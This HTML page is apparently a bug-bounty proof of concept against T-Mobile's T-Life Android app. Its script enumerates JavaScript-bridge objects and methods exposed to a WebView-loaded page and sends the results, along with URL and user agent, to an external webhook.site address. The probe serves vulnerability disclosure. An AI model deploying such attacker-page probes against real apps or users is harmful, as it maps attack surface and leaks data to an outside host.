<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>T-Life JS bridge probe</title>
</head>
<body style="font-family:monospace;background:#111;color:#0f0;padding:1em">
<h1 id="status">Running probe...</h1>
<p>This page is part of a Bugcrowd submission against T-Mobile (T-Life Android). It probes which Android JavaScript-bridge methods are exposed to a WebView-loaded attacker page. Read-only — does not invoke any dangerous method.</p>
<pre id="results"></pre>
<script>
(function(){
  var WH = "https://webhook.site/5a17577b-b274-42ef-84f8-8b15a63a12a8";
  var results = {};
  function send(label, val){
    results[label] = val;
    try { document.getElementById('results').textContent = JSON.stringify(results, null, 2); } catch(e){}
    try { fetch(WH + "?probe=" + encodeURIComponent(label) + "&val=" + encodeURIComponent(JSON.stringify(val).slice(0, 400))).catch(function(){}); } catch(e){}
  }
  send("alive", true);
  send("location", location.href);
  send("ua", navigator.userAgent);
  send("doc_title", document.title);
  ["Android", "android", "PlayStoreBridge", "opener"].forEach(function(name){
    var o = window[name];
    if (!o) { send("bridge_" + name, "undefined"); return; }
    var meths = {};
    ["openpdf", "openotp", "openPlayStore", "postMessage", "downloadCsv"].forEach(function(m){
      meths[m] = typeof o[m];
    });
    send("bridge_" + name, meths);
  });
  document.getElementById('status').textContent = 'Probe complete — see webhook';
})();
</script>
</body>
</html>
